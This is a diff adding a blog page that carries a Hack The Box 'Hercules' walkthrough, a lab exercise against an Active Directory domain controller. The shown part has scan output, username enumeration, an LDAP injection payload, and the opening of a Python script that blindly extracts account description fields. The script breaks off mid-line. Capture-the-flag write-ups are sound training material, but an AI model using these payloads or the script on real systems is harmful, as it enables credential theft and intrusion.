@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/09/24/hackthebox-hercules/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewHercules is an insane-difficulty Windows machine from Hack The Box built around a full Active Directory environment fronted by an ASP.NET web portal. We start by enumerating valid domain accou">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Hercules">
+<meta property="og:url" content="http://fouedsaidi.com/2026/09/24/Hackthebox-Hercules/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewHercules is an insane-difficulty Windows machine from Hack The Box built around a full Active Directory environment fronted by an ASP.NET web portal. We start by enumerating valid domain accou">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Hercules/Hercules.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Hercules/ken-dashboard.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Hercules/webadmin-dashboard.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Hercules/webadmin-forms.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Hercules/hadesweb-dll.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Hercules/report-submitted.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Hercules/bloodhound-path.png">
+<meta property="article:published_time" content="2026-09-24T11:12:00.000Z">
+<meta property="article:modified_time" content="2026-09-24T18:12:59.993Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Kerberos">
+<meta property="article:tag" content="Active Directory">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="LDAP Injection">
+<meta property="article:tag" content="ASP.NET machineKey">
+<meta property="article:tag" content="Forged Auth Ticket">
+<meta property="article:tag" content="dnSpy">
+<meta property="article:tag" content="NTLM Coercion">
+<meta property="article:tag" content="Responder">
+<meta property="article:tag" content="BloodHound">
+<meta property="article:tag" content="Shadow Credentials">
+<meta property="article:tag" content="Certipy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Hercules/Hercules.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Hercules -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Hercules</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-09-24 14:12</span>
+        <span class="mobile">2026-09-24 14:12</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-09-24 21:12:59</span>
+            <span class="mobile">2026-09-24 21:12:59</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Kerberos/">Kerberos</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Active-Directory/">Active Directory</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/LFI/">LFI</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/LDAP-Injection/">LDAP Injection</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ASP-NET-machineKey/">ASP.NET machineKey</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Forged-Auth-Ticket/">Forged Auth Ticket</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/dnSpy/">dnSpy</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/NTLM-Coercion/">NTLM Coercion</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Responder/">Responder</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/BloodHound/">BloodHound</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Shadow-Credentials/">Shadow Credentials</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Certipy/">Certipy</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Hercules is an insane-difficulty Windows machine from Hack The Box built around a full Active Directory environment fronted by an ASP.NET web portal. We start by enumerating valid domain accounts and abusing an LDAP injection flaw in the login form to blindly read the <code>description</code> attribute of every user, which leaks a plaintext password. Spraying that password across the domain lands us on <code>ken.w</code>, giving us access to the portal. From there, a directory traversal in the download endpoint lets us pull the application’s <code>web.config</code>, exposing the ASP.NET <code>machineKey</code>. With the <code>machineKey</code> in hand we forge a <code>FormsAuthenticationTicket</code> that promotes us to the <strong>Web Administrators</strong> role, unlocking a file-upload form. Decompiling the application DLL confirms the form accepts <code>.odt</code>&#x2F;<code>.docx</code> files, so we craft a malicious ODF document to coerce a NetNTLMv2 hash from <code>natalie.a</code>, crack it, and use BloodHound to map a <code>GenericWrite</code> path that lets us perform a Shadow Credentials attack against <code>bob.w</code> and recover their NT hash.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Hercules/Hercules.png"
+                      alt="Hercules-info-card"
+                ><figcaption>Hercules-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We kick things off with an <code>nmap</code> scan against the target:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Did not follow redirect to https://10.129.245.151/</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-21 04:37:07Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.hercules.htb</span><br><span class="line">| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES</span><br><span class="line">443/tcp  open  ssl/http      Microsoft IIS httpd 10.0</span><br><span class="line">| ssl-cert: Subject: commonName=hercules.htb</span><br><span class="line">| Subject Alternative Name: DNS:hercules.htb</span><br><span class="line">|_http-title: Hercules Corp</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0.)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0.)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0.)</span><br><span class="line">5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure></div>
+
+<p>This is the classic Active Directory service spread — DNS (53), Kerberos (88), LDAP (389&#x2F;636&#x2F;3268&#x2F;3269), SMB (445), RPC (135&#x2F;593) and WinRM over SSL (5986). On top of that we have IIS serving both HTTP (80) and HTTPS (443), with the certificate and redirect telling us the box is <code>dc.hercules.htb</code> and the site is called <strong>Hercules Corp</strong>. Let’s add the relevant hostnames to our <code>/etc/hosts</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.129.245.151 hercules.htb dc.hercules.htb</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Username-Enumeration"><a href="#Username-Enumeration" class="headerlink" title="Username Enumeration"></a>Username Enumeration</h2><p>Before touching the web app, it’s worth building a valid list of domain accounts. Corporate directories almost always follow a <code>firstname.lastname</code> or <code>firstname.x</code> naming convention, so we take a common names wordlist and append every letter of the alphabet to each name, generating candidates like <code>john.a</code>, <code>john.b</code>, and so on:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#x27; /^[[:space:]]*$/ &#123;next&#125; &#123; gsub(/^[ \t]+|[ \t]+$/,&quot;&quot;); for(i=97;i&lt;=122;i++) printf &quot;%s.%c\n&quot;, $0, i &#125;&#x27; \</span><br><span class="line">  /usr/share/wordlists/seclists/Usernames/Names/names.txt | sudo tee /usr/share/seclists/Usernames/Names/names.withletters.txt &gt; /dev/null &amp;&amp; echo &quot;Created: /usr/share/wordlists/seclists/Usernames/Names/names.withletters.txt&quot;</span><br><span class="line">Created: /usr/share/wordlists/seclists/Usernames/Names/names.withletters.txt</span><br></pre></td></tr></table></figure></div>
+
+<p>We feed this wordlist to <code>kerbrute userenum</code> against the KDC, which validates usernames against Kerberos pre-authentication without ever locking accounts out. This leaves us with the following 40 valid domain accounts:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adriana.i     angelo.o      anthony.r     ashley.b      auditor</span><br><span class="line">bob.w         camilla.b     clarissa.c    elijah.m      fernando.r</span><br><span class="line">fiona.c       harris.d      heather.s     jacob.b       james.s</span><br><span class="line">jennifer.a    jessica.e     joel.c        johanna.f     johnathan.j</span><br><span class="line">ken.w         mark.s        mikayla.a     natalie.a     nate.h</span><br><span class="line">patrick.s     ramona.l      ray.n         rene.s        shae.j</span><br><span class="line">stephanie.w   stephen.m     tanya.r       taylor.m      tish.c</span><br><span class="line">vincent.g     web_admin     will.s        winda.s       zeke.s</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LDAP-Injection-—-Leaking-the-description-Attribute"><a href="#LDAP-Injection-—-Leaking-the-description-Attribute" class="headerlink" title="LDAP Injection — Leaking the description Attribute"></a>LDAP Injection — Leaking the <code>description</code> Attribute</h2><p>Browsing to <code>https://hercules.htb/</code> we’re greeted with the Hercules Corp portal and a login form. Since the box is a domain controller and the site authenticates against the directory, the login form is a prime candidate for <strong>LDAP injection</strong>. By submitting a payload like <code>username*)(description=*</code> we can turn the authentication query into a boolean oracle: if the injected filter matches, the app returns <em>“Login attempt failed”</em> (a valid user with the wrong password), and if it doesn’t, we get a different response. That difference is enough to brute-force the <code>description</code> attribute of any account one character at a time.</p>
+<p>The AD <code>description</code> field is a notoriously common place for admins to stash passwords, so this is exactly what we’re hunting for. Here’s the script that automates the blind enumeration across all 40 users:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">BASE = <span class="string">&quot;https://10.129.191.240&quot;</span></span><br><span class="line">LOGIN_PATH = <span class="string">&quot;/Login&quot;</span></span><br><span class="line">LOGIN_PAGE = <span class="string">&quot;/login&quot;</span></span><br><span class="line">TARGET_URL = BASE + LOGIN_PATH</span><br><span class="line">VERIFY_TLS = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">SUCCESS_INDICATOR = <span class="string">&quot;Login attempt failed&quot;</span></span><br><span class="line">TOKEN_RE = re.<span class="built_in">compile</span>(<span class="string">r&#x27;name=&quot;__RequestVerificationToken&quot;\s+type=&quot;hidden&quot;\s+value=&quot;([^&quot;]+)&quot;&#x27;</span>, re.IGNORECASE)</span><br><span class="line"></span><br><span class="line">KNOWN_USERS = [</span><br><span class="line">    <span class="string">&quot;adriana.i&quot;</span>, <span class="string">&quot;angelo.o&quot;</span>, <span class="string">&quot;anthony.r&quot;</span>, <span class="string">&quot;ashley.b&quot;</span>, <span class="string">&quot;auditor&quot;</span>, <span class="string">&quot;bob.w&quot;</span>,</span><br><span class="line">    <span class="string">&quot;camilla.b&quot;</span>, <span class="string">&quot;clarissa.c&quot;</span>, <span class="string">&quot;elijah.m&quot;</span>, <span class="string">&quot;fernando.r&quot;</span>, <span class="string">&quot;fiona.c&quot;</span>, <span class="string">&quot;harris.d&quot;</span>,</span><br><span class="line">    <span class="string">&quot;heather.s&quot;</span>, <span class="string">&quot;jacob.b&quot;</span>, <span class="string">&quot;james.s&quot;</span>, <span class="string">&quot;jennifer.a&quot;</span>, <span class="string">&quot;jessica.e&quot;</span>, <span class="string">&quot;joel.c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;johanna.f&quot;</span>, <span class="string">&quot;johnathan.j&quot;</span>, <span class="string">&quot;ken.w&quot;</span>, <span class="string">&quot;mark.s&quot;</span>, <span class="string">&quot;mikayla.a&quot;</span>, <span class="string">&quot;natalie.a&quot;</span>,</span><br><span class="line">    <span class="string">&quot;nate.h&quot;</span>, <span class="string">&quot;patrick.s&quot;</span>, <span class="string">&quot;ramona.l&quot;</span>, <span class="string">&quot;ray.n&quot;</span>, <span class="string">&quot;rene.s&quot;</span>, <span class="string">&quot;shae.j&quot;</span>,</span><br><span class="line">    <span class="string">&quot;stephanie.w&quot;</span>, <span class="string">&quot;stephen.m&quot;</span>, <span class="string">&quot;tanya.r&quot;</span>, <span class="string">&quot;taylor.m&quot;</span>, <span class="string">&quot;tish.c&quot;</span>, <span class="string">&quot;vincent.g&quot;</span>,</span><br><span class="line">    <span class="string">&quot;web_admin&quot;</span>, <span class="string">&quot;will.s&quot;</span>, <span class="string">&quot;winda.s&quot;</span>, <span class="string">&quot;zeke.s&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_token_and_cookie</span>(<span class="params">session</span>):</span><br><span class="line">    response = session.get(BASE + LOGIN_PAGE, verify=VERIFY_TLS)</span><br><span class="line">    <span class="keyword">match</span> = TOKEN_RE.search(response.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>) <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_ldap_injection</span>(<span class="params">username, description_prefix=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    token = get_token_and_cookie(session)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> 